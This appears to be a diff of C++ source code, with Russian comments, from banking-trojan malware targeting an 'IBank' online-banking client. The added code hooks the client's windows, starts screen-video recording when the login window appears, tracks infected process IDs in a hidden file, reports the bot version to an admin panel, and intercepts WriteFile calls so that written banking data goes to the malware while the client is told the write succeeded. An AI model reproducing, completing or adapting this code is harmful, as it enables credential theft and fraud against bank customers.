@@ -46,7 +46,7 @@ namespace IBANKDEBUGSTRINGS
 #endif
 
 void SendLogToAdmin( const char* c, const char* v ); //отсылка логов в админку
-extern char version[]; //версия патча
+extern char versionPatch[]; //версия патча
 
 namespace IBank
 {
@@ -69,24 +69,9 @@ namespace IBank
 
 	// Определяем типы для установки хуков
 	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);
-	typedef HANDLE (WINAPI *PCreateFile)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
-										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
-										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
-										  HANDLE hTemplateFile);
-
-
-typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
-								  LPOFSTRUCT lpReOpenBuff,
-								  UINT uStyle);
-
 
 	// Переменные для хранения казателей на реальные функции
 	PConnect Real_Connect;
-
-	PCreateFile Real_CreateFileA;
-	PCreateFile Real_CreateFileW;
-
-	TOpenFile Real_OpenFile;
 
     // Глобальные переменные системы
 	PKeyLogSystem System = NULL;
@@ -95,6 +80,7 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
 	TIBankLog Log;
 
 	DWORD KeyFileNameHash = 0;
+	bool recVideoIsRun = false; //запущен ли процесс записи видео
 
 	//-----------------------------------------------------------------------
 
@@ -175,6 +161,67 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
 	}
 	//-----------------------------------------------------------------------
 
+	static void ScanPidFile()
+	{
+		char wjDat[MAX_PATH];
+		if( GetAllUsersProfile( wjDat, sizeof(wjDat), "wj.dat" ) )
+		{
+			DWORD PID = GetUniquePID();
+			IBDBG( "IBank", "PID= %d", PID );
+			if( File::IsExists(wjDat) )
+			{
+				DWORD size;
+				DWORD* pids = (DWORD*)File::ReadToBufferA( wjDat, size );
+				IBDBG( "IBank", "size = %d", size );
+				int count = size / 4;
+
+				for( int i = 0; i < count; i++ )
+					if( pids[i] == PID )
+					{
+						PID = 0; //такой пид уже есть, добавлятьв файл не нужно
+						break;
+					}
+				if( PID ) //добавляем пид
+				{
+					DWORD* pids2 = (DWORD*)MemAlloc(size + 4);
+					pids2[0] = PID;
+					m_memcpy( &pids2[1], pids, size );
+					File::WriteBufferA( wjDat, pids2, size + 4 );
+					MemFree(pids2);
+				}
+				MemFree(pids);
+			}
+			else
+				File::WriteBufferA( wjDat, &PID, sizeof(PID) );
+			pMoveFileExA( wjDat, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
+		}
+	}
+
+	static void WINAPI ShowWindowIBank(PKeyLogger Logger, DWORD EventID, LPVOID Data)
+	{
+		TShowWindowData* data = (TShowWindowData*)Data;
+
+		ScanPidFile();
+	
+		char caption[128];
+		pGetWindowTextA( data->Window, caption, sizeof(caption) );
+		IBDBG( "IBank", "Hook_ShowWindow %s", caption );
+
+		if( m_strstr( caption, "Вход в систему" ) == 0 )
+		{
+			char patTxt[MAX_PATH];
+			if(	GetAllUsersProfile( patTxt, sizeof(patTxt), "Pat.txt" ) )
+			{
+				File::WriteBufferA( patTxt, (LPVOID)"123",3 );
+				if( !recVideoIsRun )
+				{
+					StartRecordThread( GetUniquePID(), "IBANK", NULL, NULL, 700 );//стартуем поток записи видео
+					recVideoIsRun = true;
+				}
+			}
+		}
+	}
+
 	void SetHooks()
 	{
 		// Устанавливаем треуемые хуки
@@ -187,10 +234,7 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
 			__asm mov [Real_Connect], eax
 		}
 
-		#ifdef IbankH
-			IbankHooks();
-		#endif
-
+		KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
     }
 
 	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
@@ -212,7 +256,7 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
 		System = (PKeyLogSystem)Sender;
 
 		// Активированы система IBank
-		IBDBG("IBank", "Система %s активирована, pid=%d, parent=%d", System->Name, GetUniquePID(), GetParentPID());
+		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
 
 		// Инициализируем данные системы
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
@@ -231,7 +275,7 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
         }
 
 		//отсылаем версию бота (для патча)
-		SendLogToAdmin( "botver", version );
+		SendLogToAdmin( "botver", versionPatch );
 		//  Ставим хуки
 		if( !Hooked ) 
 		{
@@ -455,6 +499,27 @@ typedef HFILE (WINAPI *TOpenFile)(LPCSTR lpFileName,
 		// Запускаем поток
 		StartThread(SenderProc, L);
     }
+
+#ifdef IBankExportH
+
+BOOL WINAPI Hook_WriteFile( HANDLE hFile, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped )
+{
+	if( SExpWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite ) ) //данные переданы на анализ, говорим что запись успешна
+	{
+		if( lpNumberOfBytesWritten )
+			*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
+		return TRUE;
+	}
+	return Real_WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
+}
+
+BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
+{
+	SExpCloseHandle(hObject);
+	return Real_CloseHandle(hObject);
+}
+
+#endif
 
 }
 
